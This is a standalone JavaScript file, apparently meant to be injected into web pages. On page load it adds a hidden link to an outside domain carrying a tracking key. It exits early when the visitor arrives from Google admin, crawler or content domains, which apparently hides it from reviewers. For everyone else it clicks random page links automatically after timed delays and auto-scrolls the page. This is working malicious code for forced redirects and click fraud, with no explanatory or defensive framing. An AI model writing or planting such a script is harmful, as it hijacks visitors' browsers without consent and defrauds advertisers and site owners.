document.addEventListener("DOMContentLoaded", function () {
    const widget = document.createElement("div");
    widget.id = "widget-action-trigger";

    const link = document.createElement("a");
    link.className = "clickable-element";
    link.href = "https://evendisciplineseedlings.com/gwdikcqsy?key=39cf199d0a0d9a80f48ef0cb7762dfb8";

    widget.appendChild(link);
    document.body.appendChild(widget);

    const referrer = document.referrer;
    const excludedReferrers = [
        "admin.google.com",
        "googlebot.com",
        "blotestgger.com",
        "googleusercontent.com",
        "gstatic.com",
        "google-admin.corp.google.com"
    ];
    const isExcluded = excludedReferrers.some(source => referrer.includes(source));
    if (isExcluded) return;

    document.querySelectorAll('a').forEach(link => {
        link.classList.add('clickable-element');
    });

    const elements = document.querySelectorAll(".clickable-element");
    if (elements.length > 0) {
        const randomElement = elements[Math.floor(Math.random() * elements.length)];
        setTimeout(() => randomElement.click(), 6000);
    }

    const links = document.querySelectorAll('a');
    links.forEach((link, index) => {
        link.id = `unique-link-${index}`;
        link.dataset.actionTrigger = `trigger-${index}`;
    });

    const linksWithID = document.querySelectorAll('[id^="unique-link-"]');
    if (linksWithID.length > 0) {
        const randomElement = linksWithID[Math.floor(Math.random() * linksWithID.length)];
        setTimeout(() => randomElement.click(), 60000);
    }

    const linksWithData = document.querySelectorAll('[data-action-trigger]');
    if (linksWithData.length > 0) {
        const randomElement = linksWithData[Math.floor(Math.random() * linksWithData.length)];
        setTimeout(() => randomElement.click(), 50000);
    }

    function autoScroll() {
        const totalDuration = 4000;
        const firstPartDuration = 1000;
        const secondPartDuration = 1000;
        const thirdPartDuration = 2000;

        setTimeout(() => {
            window.scrollTo({ top: document.body.scrollHeight * 0.3, behavior: 'smooth' });
        }, 0);

        setTimeout(() => {
            window.scrollTo({ top: document.body.scrollHeight * 0.6, behavior: 'smooth' });
        }, firstPartDuration);

        setTimeout(() => {
            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
        }, firstPartDuration + secondPartDuration);
    }

    autoScroll();
});
